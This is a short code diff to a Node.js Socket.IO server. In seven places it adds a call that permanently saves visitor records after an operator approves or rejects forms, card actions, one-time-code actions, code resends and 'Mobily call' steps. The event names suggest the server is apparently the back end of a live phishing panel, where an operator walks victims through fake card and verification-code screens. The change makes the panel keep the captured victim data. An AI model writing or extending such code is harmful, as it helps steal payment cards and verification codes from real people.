@@ -513,6 +513,7 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Form approved for visitor: ${visitorSocketId}`);
@@ -527,6 +528,7 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Form rejected for visitor: ${visitorSocketId}`);
@@ -540,6 +542,7 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
@@ -568,6 +571,7 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
@@ -581,6 +585,7 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
@@ -594,6 +599,7 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
@@ -607,6 +613,7 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Resend approved for visitor ${visitorSocketId}`);
